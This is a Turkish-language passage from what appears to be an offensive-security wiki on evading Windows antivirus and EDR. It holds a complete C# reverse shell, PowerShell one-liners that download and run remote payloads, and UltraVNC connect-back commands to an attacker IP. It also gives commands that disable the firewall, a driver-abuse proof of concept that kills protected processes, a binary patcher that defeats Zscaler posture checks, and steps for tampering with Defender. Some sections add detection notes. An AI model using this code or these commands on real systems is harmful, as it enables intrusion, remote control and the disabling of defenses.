AMSI'nin nasıl devre dışı bırakıldığına (bypass edildiğine) benzer şekilde, kullanıcı alanı işlemindeki `EtwEventWrite` fonksiyonunun hiçbir olay kaydetmeden hemen dönüş yapmasını sağlamak da mümkündür. Bu, fonksiyonu bellekte patch'leyerek hemen dönüş yapacak şekilde değiştirmek suretiyle gerçekleştirilir; böylece o işlem için ETW kaydı etkili bir şekilde devre dışı bırakılmış olur.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# ikili dosyalarının belleğe yüklenmesi uzun zamandır biliniyor ve AV tarafından yakalanmadan post-exploitation araçlarınızı çalıştırmak için hâlâ çok etkili bir yöntemdir.

Payload doğrudan diske dokunmadan belleğe yükleneceği için, tüm işlem için yalnızca AMSI'yi patch'lemek konusunda endişelenmemiz gerekecek.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc, vb.) zaten C# assembly'lerini doğrudan bellekte çalıştırma yeteneği sağlar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, **yeni bir kurban işlem başlatmayı**, post-exploitation kötü amaçlı kodunuzu o yeni işleme inject etmeyi, kodunuzu çalıştırmayı ve tamamlandığında yeni işlemi sonlandırmayı içerir. Bunun hem faydaları hem de sakıncaları vardır. Fork and Run yönteminin faydası, yürütmenin Beacon implant işlemimizin **dışında** gerçekleşmesidir. Bu, post-exploitation eylemimizde bir şey ters gider veya tespit edilirse implantımızın hayatta kalma ihtimalinin **çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise Behavioural Detections tarafından yakalanma olasılığınızın **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu, post-exploitation kötü amaçlı kodu **kendi işlemine** inject etmeyi kapsar. Bu sayede yeni bir işlem oluşturmak ve AV tarafından taranmasını sağlamak zorunda kalmazsınız, ancak dezavantajı payload'unuzun yürütülmesinde bir şeyler ters giderse beacon'ınızı kaybetme ihtimalinin **çok daha yüksek** olmasıdır çünkü işlem çökebilir.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eğer C# Assembly yükleme hakkında daha fazla okumak isterseniz, şu makaleye bakın [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'larına göz atın ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assemblies'i PowerShell'den de yükleyebilirsiniz; bakınız [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), saldırgan tarafından kontrol edilen SMB paylaşımında kurulu interpreter ortamına erişim vererek diğer diller kullanılarak kötü amaçlı kod çalıştırmak mümkündür.

Interpreter Binaries ve SMB paylaşımındaki ortama erişime izin vererek, ele geçirilmiş makinenin belleği içinde bu dillerde keyfi kod çalıştırabilirsiniz.

Repo şu notu içeriyor: Defender hâlâ scriptleri tarıyor ancak Go, Java, PHP vb. kullanarak statik imzalardan kaçınmak için **daha fazla esneklik** elde ediyoruz. Bu dillerde rastgele, obfuscate edilmemiş reverse shell scriptleri ile yapılan testler başarılı oldu.

## TokenStomping

Token stomping, saldırganın erişim token'ını veya bir güvenlik ürünü (EDR veya AV gibi) üzerinde değişiklik yapmasına olanak tanıyan bir tekniktir; böylece hakları azaltılarak süreç ölmez ama kötü amaçlı etkinlikleri kontrol etme izni olmaz.

Bunu önlemek için Windows, güvenlik proseslerinin token'ları üzerinde dış süreçlerin handle almasını **engelleyebilir**.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), kurbanın PC'sine Chrome Remote Desktop'ı dağıtıp bunu ele geçirmek ve kalıcılık sağlamak için kullanmak oldukça kolaydır:
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH"e tıklayın ve ardından Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Yükleyiciyi kurbanda sessizce çalıştırın (admin gerekli): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Sihirbaz sizden yetki isteyecektir; devam etmek için Authorize düğmesine tıklayın.
4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Not: pin param GUI kullanmadan pin belirlemeye izin verir).

## Advanced Evasion

Evasion çok karmaşık bir konudur; bazen tek bir sistemde birçok farklı telemetri kaynağını hesaba katmanız gerekir, bu yüzden olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkansızdır.

Her ortamın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94)'ın bu konuşmasını izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu aynı zamanda [@mariuszbit](https://twitter.com/mariuszbit)'in Evasion in Depth hakkında harika bir konuşmasıdır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)'i kullanabilirsiniz; bu araç ikilinin parçalarını kaldırarak Defender'ın hangi kısmı kötü amaçlı bulduğunu tespit eder ve size ayırır.\
Aynı işi yapan başka bir araç da [**avred**](https://github.com/dobin/avred) olup, hizmeti açık web üzerinden [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde sunmaktadır.

### **Telnet Server**

Windows10'a kadar, tüm Windows sürümleri (yönetici olarak) kurabileceğiniz bir **Telnet server** ile geliyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında **start** olmasını sağlayın ve şimdi **run** edin:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portunu değiştir** (stealth) ve firewall'ı devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin indirmelerini istiyorsunuz, setup'ı değil)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ için bir parola belirleyin
- _View-Only Password_ için bir parola belirleyin

Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UYARI:** Gizliliği korumak için bazı şeyleri yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın, aksi takdirde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın, aksi takdirde [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` çalıştırmayın, aksi takdirde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

İndirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT'in İçinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi `msfconsole -r file.rc` ile **lister'ı başlatın** ve **xml payload'u** **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derlemek

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

Şununla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Şununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# derleyicisini kullanma
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve yürütme:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# için obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python ile injector oluşturma örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha fazlası

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Alanından AV/EDR'i Sonlandırma

Storm-2603, fidye yazılımı bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** adlı küçük bir konsol aracını kullandı. Araç kendi **zayıf ama *imzalı* sürücüsünü** getirir ve Protected-Process-Light (PPL) AV hizmetlerinin bile engelleyemeyeceği ayrıcalıklı kernel işlemlerini gerçekleştirmek için bunu kötüye kullanır.

Ana noktalar
1. **İmzalı sürücü**: Diske bırakılan dosya `ServiceMouse.sys` olarak görünür, ancak ikili dosya Antiy Labs’in “System In-Depth Analysis Toolkit”inden meşru şekilde imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Servis kurulumu**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır sürücüyü bir **kernel servisi** olarak kaydeder, ikinci satır ise başlatır; böylece `\\.\ServiceMouse` kullanıcı alanından erişilebilir hale gelir.
3. **Sürücünün açığa çıkardığı IOCTL'ler**
| IOCTL kodu | İşlevi                              |
|-----------:|-------------------------------------|
| `0x99000050` | PID ile herhangi bir süreci sonlandırır (Defender/EDR servislerini sonlandırmak için kullanıldı) |
| `0x990000D0` | Diskteki herhangi bir dosyayı siler |
| `0x990001D0` | Sürücüyü unload eder ve servisi kaldırır |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Neden işe yarıyor**: BYOVD kullanıcı-modu korumalarını tamamen atlar; kernel içinde çalışan kod *korumalı* süreçleri açabilir, sonlandırabilir veya kernel nesnelerine müdahale edebilir; PPL/PP, ELAM veya diğer sertleştirme özelliklerinden bağımsız olarak.

Tespit / Hafifletme
•  Microsoft’un vulnerable-driver blok listesini (`HVCI`, `Smart App Control`) etkinleştirin, böylece Windows `AToolsKrnl64.sys` yüklemeyi reddeder.  
•  Yeni *kernel* servislerinin oluşturulmasını izleyin ve bir sürücü world-writable bir dizinden yüklendiğinde veya allow-list'te bulunmadığında alarm verin.  
•  Özel device objelerine yönelik kullanıcı-modu handle'ları ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### On-Disk Binary Patching ile Zscaler Client Connector Posture Kontrollerini Baypas Etme

Zscaler’ın **Client Connector** bileşeni cihaz-duruş kurallarını yerel olarak uygular ve sonuçları diğer bileşenlerle iletmek için Windows RPC’ye güvenir. İki zayıf tasarım tercihi tam bir baypası mümkün kılar:

1. Posture değerlendirmesi **tamamen client-side** gerçekleşir (sunucuya bir boolean gönderilir).
2. Dahili RPC endpoint'leri yalnızca bağlanan yürütülebilir dosyanın Zscaler tarafından **imzalandığını** doğrular (`WinVerifyTrust` aracılığıyla).

Diskteki dört imzalı ikiliyi patchleyerek her iki mekanizma da etkisiz hale getirilebilir:

| Binary | Orijinal mantık yaması | Sonuç |
|--------|------------------------|-------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür, böylece her kontrol uyumlu olur |
| `ZSAService.exe` | `WinVerifyTrust`'e dolaylı çağrı | NOP-ed ⇒ herhangi bir (imzasız dahi) süreç RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilmiş |
| `ZSATunnel.exe` | Tunnel üzerindeki bütünlük kontrolleri | Kısa devre yapılmış |

Minimal patcher örneği:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyaları değiştirdikten ve servis yığını yeniden başlattıktan sonra:

* **Tüm** posture kontrolleri **yeşil/uyumlu** olarak görünür.
* İmzalanmamış veya değiştirilmiş ikili dosyalar, named-pipe RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* İhlal edilmiş host, Zscaler politikalarıyla tanımlanan iç ağa sınırsız erişim kazanır.

Bu vaka çalışması, tamamen istemci tarafı güven kararlarının ve basit imza kontrollerinin birkaç byte yamasıyla nasıl alt edilebileceğini gösteriyor.

## Protected Process Light (PPL) Kullanarak LOLBINs ile AV/EDR'e Müdahale Etme

Protected Process Light (PPL), yalnızca aynı veya daha yüksek korumalı süreçlerin birbirine müdahale edebilmesini sağlamak için bir imzalayıcı/seviye hiyerarşisini zorunlu kılar. Saldırgan amaçlı olarak, eğer yasal olarak PPL-etkin bir ikiliyi başlatıp argümanlarını kontrol edebiliyorsanız, zararsız işlevselliği (ör. kayıt tutma) AV/EDR tarafından kullanılan korumalı dizinlere karşı sınırlı, PPL destekli bir yazma primitifi haline dönüştürebilirsiniz.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- Süreç CreateProcess ile şu flag'ler kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- İkili dosyanın imzalayıcısıyla eşleşen uyumlu bir protection level talep edilmelidir (ör. anti-malware imzalayıcıları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows imzalayıcıları için `PROTECTION_LEVEL_WINDOWS`). Yanlış seviyeler oluşturma sırasında başarısız olacaktır.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Açık kaynak yardımcı: CreateProcessAsPPL (koruma seviyesini seçer ve argümanları hedef EXE'ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Kullanım deseni:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- İmzalı sistem ikili dosyası `C:\Windows\System32\ClipUp.exe` kendini yeni bir süreç olarak başlatır ve çağıranın belirttiği bir yola log dosyası yazmak için bir parametre kabul eder.
- Bir PPL süreci olarak başlatıldığında, dosya yazma PPL desteği ile gerçekleşir.
- ClipUp boşluk içeren yolları ayrıştıramaz; normalde korumalı konumlara işaret etmek için 8.3 kısa yolları kullanın.

8.3 short path helpers
- Kısa adları listele: `dir /x` her üst dizinde.
- cmd'de kısa yolu türetin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Bir launcher (ör. CreateProcessAsPPL) kullanarak `CREATE_PROTECTED_PROCESS` ile PPL-capable LOLBIN (ClipUp) başlatın.
2) ClipUp log-path argümanını, korunmuş bir AV dizininde (ör. Defender Platform) dosya oluşturmayı zorlamak için geçin. Gerekirse 8.3 kısa adları kullanın.
3) Hedef ikili normalde AV tarafından çalışırken açık/kilitliyse (ör. MsMpEng.exe), yazmayı AV başlamadan önce önyükleme sırasında gerçekleştirecek şekilde, daha erken güvenilir çalışan bir otomatik başlatma servisi kurarak zamanlayın. Önyükleme sıralamasını Process Monitor (boot logging) ile doğrulayın.
4) Yeniden başlatmada PPL-backed yazma, AV ikililerini kilitlemeden önce gerçekleşir; hedef dosyayı bozarak başlangıcı engeller.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlamalar
- ClipUp'un yazdığı içeriği yerleştirme dışında kontrol edemezsiniz; bu primitif hassas içerik enjeksiyonundan ziyade bozulma için uygundur.
- Bir hizmeti kurmak/başlatmak ve yeniden başlatma zamanı gerektirir; yerel admin/SYSTEM erişimi gerekir.
- Zamanlama kritik: hedef açık olmamalı; önyükleme zamanı yürütme dosya kilitlerini önler.

Tespitler
- Özellikle önyükleme çevresinde, alışılmadık argümanlarla çalışan ve standart olmayan başlatıcılar tarafından ebeveynlenmiş `ClipUp.exe` süreç oluşturuları.
- Şüpheli ikili dosyaları otomatik başlatacak şekilde yapılandırılmış yeni servisler ve Defender/AV'den önce sürekli başlayan servisler. Defender başlatma hatalarından önceki servis oluşturma/değişikliklerini araştırın.
- Defender ikili dosyaları/Platform dizinlerinde dosya bütünlüğü izleme; protected-process bayraklarına sahip süreçler tarafından beklenmeyen dosya oluşturma/değişiklikleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV olmayan ikililer tarafından anormal PPL düzeyi kullanımını arayın.

Önlemler
- WDAC/Code Integrity: hangi imzalı ikililerin PPL olarak çalışabileceğini ve hangi ebeveynler altında çalışabileceğini kısıtlayın; meşru bağlamlar dışındaki ClipUp çağrılarını engelleyin.
- Servis hijyeni: otomatik başlatmalı servislerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender tamper protection ve early-launch korumalarının etkin olduğundan emin olun; ikili dosya bozulmasını gösteren başlangıç hatalarını araştırın.
- Güvenlik araçlarını barındıran hacimlerde uyumluysa 8.3 kısa ad oluşturmayı devre dışı bırakmayı düşünün (iyi test edin).

PPL ve araçlar için referanslar
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Platform Version Folder Symlink Hijack ile Microsoft Defender'ı Tahrif Etme

Windows Defender, çalıştığı platformu aşağıdaki alt klasörleri sıralayarak seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek leksikografik sürüm dizgesine sahip alt klasörü (ör. `4.18.25070.5-0`) seçer ve Defender servis süreçlerini oradan başlatır (hizmet/registry yollarını buna göre günceller). Bu seçim dizin girdilerine, dizin yeniden yönlendirme noktaları (symlinkler) dahil, güvenir. Bir yönetici bunu kullanarak Defender'ı saldırganın yazabildiği bir yola yönlendirebilir ve DLL sideloading veya servis kesintisi gerçekleştirebilir.

Önkoşullar
- Yerel Administrator (Platform klasörü altında dizin/symlink oluşturmak için gerekli)
- Yeniden başlatma yapabilme veya Defender platform yeniden seçimini tetikleyebilme (önyüklemede servis yeniden başlatma)
- Sadece yerleşik araçlar gerekir (mklink)

Neden işe yarar
- Defender kendi klasörlerine yazmayı engeller, ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözümlendiğini doğrulamadan leksikografik olarak en yüksek sürümü seçer.

Adım adım (örnek)
1) Mevcut platform klasörünün yazılabilir bir klonunu hazırlayın, örn. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde, klasörünüze işaret eden daha yüksek sürümlü bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) yönlendirilen yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Defender'ın uygulama dizininden yüklediği DLL'leri bırakın/değiştirin ve Defender süreçlerinde kod çalıştırın. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink'i kaldırın, böylece bir sonraki başlatmada yapılandırılmış yol çözümlenmez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Bu tekniğin tek başına ayrıcalık yükseltme sağlamadığını unutmayın; yönetici hakları gerektirir.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Kırmızı ekipler runtime evasion'ı C2 implant'tan hedef modülün kendisine taşıyabilir; bunun için Import Address Table (IAT) üzerinde hook uygulayıp seçili API'leri saldırgan kontrollü, position‑independent code (PIC) üzerinden yönlendirirler. Bu, birçok kitin açığa çıkardığı küçük API yüzeyinin (ör. CreateProcessA) ötesine geçerek evasions'ı genelleştirir ve aynı korumaları BOFs ve post‑exploitation DLLs için de genişletir.

High-level approach
- Reflective loader (prepended or companion) kullanarak hedef modülle birlikte bir PIC blob'u sahneleyin. PIC kendi içinde bağımsız ve position‑independent olmalıdır.
- Host DLL yüklenirken, IMAGE_IMPORT_DESCRIPTOR'ını gezip hedeflenen importlar (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) için IAT girdilerini ince PIC wrapper'lara işaret edecek şekilde patch'leyin.
- Her PIC wrapper, gerçek API adresine tail‑call yapmadan önce kaçınma işlemleri uygular. Tipik kaçınma yöntemleri şunlardır:
  - Çağrı etrafında bellek maskeleme/maske kaldırma (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa isimlerini/izinlerini değiştirme) ve çağrı sonrası geri yükleme.
  - Call‑stack spoofing: çağrı yığını analizinin beklenen çerçeveleri göstermesi için zararsız bir yığın oluşturup hedef API'ye geçiş yapın.
